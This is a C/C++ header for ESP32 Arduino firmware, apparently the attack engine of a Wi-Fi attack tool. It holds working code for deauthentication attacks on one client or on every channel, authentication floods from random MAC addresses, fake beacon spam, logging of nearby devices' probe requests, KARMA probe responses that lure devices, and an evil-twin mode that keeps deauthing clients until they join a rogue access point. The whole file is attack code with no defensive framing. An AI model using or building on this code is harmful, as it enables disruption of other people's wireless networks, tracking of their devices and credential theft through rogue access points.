#ifndef ATTACK_ENGINE_H
#define ATTACK_ENGINE_H

#include <Arduino.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <string.h>

#include "karma.h"

#define DEAUTH_BURST 5
#define AUTH_BURST 20
#define HOP_INTERVAL_MS 120
#define BEACON_HOP_MS 100
#define PROBE_LOG_SIZE 8

enum AttackMode {
  ATK_IDLE = 0,
  ATK_DEAUTH_TARGET,
  ATK_DEAUTH_GLOBAL,
  ATK_AUTH_FLOOD,
  ATK_EVIL_TWIN,
  ATK_BEACON,
  ATK_PROBE,
  ATK_KARMA
};
extern volatile AttackMode g_attackMode;

extern volatile uint32_t g_packetsSent;
extern volatile uint32_t g_txErrors;
extern volatile bool g_victimFound;
extern uint8_t g_victimMAC[6];
extern uint8_t g_targetBSSID[6];
extern volatile uint8_t g_targetChannel;

extern unsigned long evilTwinStartTime;

static const char* SPAM_SSIDS[] = {
  "Free WiFi", "MikroTik", "TP-Link", "IndiHome",
  "FBI Surveillance", "Get Free Internet", "TELKOM", "Biznet",
  "AndroidAP", "iPhone Hotspot", "HUAWEI", "ZTE",
  "Pretty Fly for WiFi", "Loading...", "Virus.exe", "Tell My WiFi Love Her"
};
static const int SPAM_COUNT = sizeof(SPAM_SSIDS) / sizeof(SPAM_SSIDS[0]);

struct ProbeEntry {
  uint8_t mac[6];
  char ssid[33];
  int8_t rssi;
};
extern ProbeEntry g_probeLog[PROBE_LOG_SIZE];
extern volatile int g_probeLogHead;
extern volatile int g_probeLogCount;

// ═══════════════════════════════════════════════
// Deauth frame
// ═══════════════════════════════════════════════
inline void sendDeauthFrame(const uint8_t* dst, const uint8_t* bssid) {
  uint8_t frame[26] = {
    0xC0, 0x00, 0x00, 0x00,
    0,0,0,0,0,0,
    0,0,0,0,0,0,
    0,0,0,0,0,0,
    0x01, 0x00
  };
  memcpy(&frame[4],  dst,   6);
  memcpy(&frame[10], bssid, 6);
  memcpy(&frame[16], bssid, 6);

  esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, frame, sizeof(frame), true);
  g_packetsSent++;
  if (err != ESP_OK) g_txErrors++;
}

inline void sendDeauthBurst(const uint8_t* bssid) {
  static const uint8_t bcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
  const uint8_t* dst = g_victimFound ? g_victimMAC : bcast;
  for (int i = 0; i < DEAUTH_BURST; i++) sendDeauthFrame(dst, bssid);
}

inline void sendBroadcastDeauthOnChannel(uint8_t n) {
  (void)n;
  static const uint8_t bcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
  for (int i = 0; i < 6; i++) sendDeauthFrame(bcast, bcast);
}

inline void globalModeTick() {
  static unsigned long lastHop = 0;
  static uint8_t ch = 1;
  if (millis() - lastHop > HOP_INTERVAL_MS) {
    ch = (ch % 13) + 1;
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
    lastHop = millis();
  }
  sendBroadcastDeauthOnChannel(ch);
}

// ═══════════════════════════════════════════════
// Auth flood
// ═══════════════════════════════════════════════
inline void sendAuthFrame(const uint8_t* srcMAC, const uint8_t* bssid) {
  uint8_t frame[30];
  memset(frame, 0, sizeof(frame));
  frame[0] = 0xB0; frame[1] = 0x00;
  memcpy(&frame[4],  bssid,  6);
  memcpy(&frame[10], srcMAC, 6);
  memcpy(&frame[16], bssid,  6);
  frame[24] = 0x00; frame[25] = 0x00;
  frame[26] = 0x01; frame[27] = 0x00;
  frame[28] = 0x00; frame[29] = 0x00;

  esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, frame, sizeof(frame), true);
  g_packetsSent++;
  if (err != ESP_OK) g_txErrors++;
}

inline void sendAuthFloodTick() {
  static unsigned long lastTx = 0;
  static uint8_t srcMAC[6] = {0xAA, 0xBB, 0xCC, 0x11, 0x22, 0x33};
  if (millis() - lastTx > 10) {
    for (int i = 0; i < AUTH_BURST; i++) {
      srcMAC[3] = (uint8_t)random(256);
      srcMAC[4] = (uint8_t)random(256);
      srcMAC[5] = (uint8_t)random(256);
      sendAuthFrame(srcMAC, g_targetBSSID);
    }
    lastTx = millis();
  }
}

// ═══════════════════════════════════════════════
// Beacon spam
// ═══════════════════════════════════════════════
inline void sendBeaconFrame(const char* ssid, const uint8_t* bssid, uint8_t ch) {
  uint8_t frame[128];
  int len = strlen(ssid);
  if (len > 32) len = 32;
  memset(frame, 0, sizeof(frame));
  frame[0] = 0x80; frame[1] = 0x00;
  frame[2] = 0x00; frame[3] = 0x00;
  memset(&frame[4], 0xFF, 6);
  memcpy(&frame[10], bssid, 6);
  memcpy(&frame[16], bssid, 6);
  frame[32] = 0x64; frame[33] = 0x00;
  frame[34] = 0x01; frame[35] = 0x04;
  int p = 36;
  frame[p++] = 0x00; frame[p++] = (uint8_t)len;
  memcpy(&frame[p], ssid, len); p += len;
  frame[p++] = 0x01; frame[p++] = 0x08;
  frame[p++] = 0x82; frame[p++] = 0x84; frame[p++] = 0x8B; frame[p++] = 0x96;
  frame[p++] = 0x0C; frame[p++] = 0x12; frame[p++] = 0x18; frame[p++] = 0x24;
  frame[p++] = 0x03; frame[p++] = 0x01; frame[p++] = ch;

  esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, frame, p, true);
  g_packetsSent++;
  if (err != ESP_OK) g_txErrors++;
}

inline void sendBeaconSpamTick() {
  static int idx = 0;
  static unsigned long lastHop = 0;
  static uint8_t ch = 1;
  if (millis() - lastHop > BEACON_HOP_MS) {
    ch = (ch % 13) + 1;
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
    lastHop = millis();
  }
  uint8_t mac[6];
  esp_wifi_get_mac(WIFI_IF_AP, mac);
  mac[5] = (uint8_t)idx;
  sendBeaconFrame(SPAM_SSIDS[idx], mac, ch);
  idx = (idx + 1) % SPAM_COUNT;
}

// ═══════════════════════════════════════════════
// Sniffer
// ═══════════════════════════════════════════════
inline void packetSniffer_cb(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (type != WIFI_PKT_MGMT && type != WIFI_PKT_DATA) return;
  wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
  uint8_t* p = pkt->payload;

  // ── Management: PROBE & KARMA ──
  if (type == WIFI_PKT_MGMT) {
    uint8_t subtype = (p[0] >> 4) & 0x0F;

    if (g_attackMode == ATK_PROBE) {
      if (subtype != 4) return;
      if (p[24] != 0x00) return;
      int len = p[25];
      if (len > 32) return;
      int idx = g_probeLogHead;
      memcpy(g_probeLog[idx].mac, &p[10], 6);
      memset(g_probeLog[idx].ssid, 0, 33);
      if (len > 0) memcpy(g_probeLog[idx].ssid, &p[26], len);
      g_probeLog[idx].rssi = pkt->rx_ctrl.rssi;
      g_probeLogHead = (g_probeLogHead + 1) % PROBE_LOG_SIZE;
      if (g_probeLogCount < PROBE_LOG_SIZE) g_probeLogCount++;
      return;
    }

    if (g_attackMode == ATK_KARMA) {
      if (subtype != 4) return;
      if (p[24] != 0x00) return;
      int len = p[25];
      if (len > 32) return;

      const uint8_t* srcMAC = &p[10];
      int8_t rssi = pkt->rx_ctrl.rssi;

      karmaLogClient(srcMAC, rssi);

      if (len > 0) {
        // Directed probe — exact SSID, respond immediately
        char probedSSID[33];
        memcpy(probedSSID, &p[26], len);
        probedSSID[len] = 0;
        karmaLogSSID(probedSSID);

        if (g_karmaActiveMode) {
          static unsigned long lastResp = 0;
          if (millis() - lastResp > 50) {
            lastResp = millis();
            sendKarmaProbeResponse(srcMAC, probedSSID);
          }
        }
      } else {
        // Broadcast probe — respond dengan curated SSIDs
        if (g_karmaActiveMode) {
          static unsigned long lastResp = 0;
          if (millis() - lastResp > 100) {
            lastResp = millis();
            for (int i = 0; i < CURATED_COUNT; i++) {
              sendKarmaProbeResponse(srcMAC, CURATED_SSIDS[i]);
            }
          }
        }
      }
      return;
    }
  }

  // ── Victim tracking untuk DEAUTH & EVIL_TWIN ──
  if (g_attackMode == ATK_DEAUTH_TARGET || g_attackMode == ATK_EVIL_TWIN) {
    uint8_t* addr1 = &p[4];
    uint8_t* addr2 = &p[10];
    uint8_t* addr3 = &p[16];
    if (memcmp(addr1, g_targetBSSID, 6) == 0 ||
        memcmp(addr2, g_targetBSSID, 6) == 0 ||
        memcmp(addr3, g_targetBSSID, 6) == 0) {
      if (memcmp(addr2, g_targetBSSID, 6) != 0 && (addr2[0] & 0x01) == 0) {
        if (!g_victimFound || memcmp(g_victimMAC, addr2, 6) != 0) {
          memcpy(g_victimMAC, addr2, 6);
          g_victimFound = true;
        }
      }
    }
  }
}

// ═══════════════════════════════════════════════
// FreeRTOS Attack Task
// ═══════════════════════════════════════════════
inline void attackTask(void* param) {
  (void)param;
  while (true) {
    switch (g_attackMode) {
      case ATK_DEAUTH_TARGET: {
        static unsigned long lastTx = 0;
        if (millis() - lastTx > 15) {
          sendDeauthBurst(g_targetBSSID);
          lastTx = millis();
        }
        break;
      }
      case ATK_DEAUTH_GLOBAL:
        globalModeTick();
        break;
      case ATK_AUTH_FLOOD:
        sendAuthFloodTick();
        break;
      case ATK_EVIL_TWIN: {
        static unsigned long lastTx = 0;
        if (millis() - evilTwinStartTime > 3000) {
          if (WiFi.softAPgetStationNum() == 0 && millis() - lastTx > 20) {
            sendDeauthBurst(g_targetBSSID);
            lastTx = millis();
          }
        }
        break;
      }
      case ATK_BEACON:
        sendBeaconSpamTick();
        break;
      case ATK_KARMA: {
        // Channel hopping 1 → 6 → 11 untuk cover channel umum
        static unsigned long lastHop = 0;
        static uint8_t hopIdx = 0;
        const uint8_t hopChannels[] = {1, 6, 11};
        if (millis() - lastHop > 300) {
          hopIdx = (hopIdx + 1) % 3;
          esp_wifi_set_channel(hopChannels[hopIdx], WIFI_SECOND_CHAN_NONE);
          lastHop = millis();
        }
        break;
      }
      default:
        break;
    }
    vTaskDelay(10 / portTICK_PERIOD_MS);
  }
}

#endif